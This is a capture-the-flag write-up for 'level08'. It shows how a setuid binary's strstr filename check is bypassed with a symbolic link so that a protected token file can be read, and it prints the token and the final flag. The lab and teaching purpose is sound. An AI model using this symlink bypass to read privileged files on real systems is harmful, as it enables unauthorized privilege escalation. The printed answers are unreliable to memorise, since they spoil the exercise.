# LEVEL 08

In our home directory, we see an executable with suid/guid, as well as a token file we don't have access to:
```
>$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
>$ ./level08
./level08 [file to read]
```
If we try with a file we own, the executable displays its content:
```
>$ echo 'hi' > /tmp/test && ./level08 /tmp/test
hi
```
but it won't work with the token file:
```
>$ ./level08 token
You may not access 'token'
```
If we execute the program and inspect it with gdb:
```
>$ gdb level08
>$ (gdb) disass main
[..]
0x080485af <+91>:	mov    DWORD PTR [esp+0x4],0x8048793 <---- "token"
0x080485b7 <+99>:	mov    DWORD PTR [esp],eax
0x080485ba <+102>:	call   0x8048400 <strstr@plt>
[..]
```
we see that it try to find the substring `token` using `strstr` function to check if the user try to open the file `token`. We can **bypass** this protection **with a symbolic link** who don't have the string `token` in his absolute path:
```
>$ ln -s $(pwd)/token /tmp/fakeTiken
>$ ls -l fakeTiken
lrwxrwxrwx 1 level08 level08 24 Jun  7 20:21 /tmp/fakeTiken -> /home/user/level08/token
```
Now if we run the program with this file:
```
>$ ./level08 /tmp/fakeTiken
quif5eloekouj29ke0vouxean
```
we use this token as passwrod on `su flag08` then we get the flag: `25749xKZ8L7DkSCwJkT9dyv6f`

#### Vulnerability:
No check on real user => Privilege escalation via symlink